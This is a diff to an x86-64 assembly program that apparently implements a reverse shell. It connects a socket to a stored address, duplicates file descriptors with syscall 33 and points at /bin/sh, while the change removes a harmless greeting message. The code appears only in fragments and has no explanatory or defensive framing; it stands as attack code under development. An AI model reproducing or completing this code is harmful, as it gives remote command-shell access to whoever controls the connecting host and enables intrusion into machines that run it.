@@ -7,10 +7,7 @@ section .data
 
     address_len equ $ - address
 
-    msg db "Hello from the ASM client!", 0xa
-    msg_len equ $ - msg
-
-    shell db "/usr/sbin/sh", 0
+    shell db "/bin/sh", 0
 
 section .bss
     socket_fd resq 1
@@ -31,12 +28,6 @@ _start:
     mov rdi, [socket_fd]
     mov rsi, address
     mov rdx, address_len
-    syscall
-
-    mov rax, 1
-    mov rdi, [socket_fd]
-    mov rsi, msg
-    mov rdx, msg_len
     syscall
 
     mov rax, 33
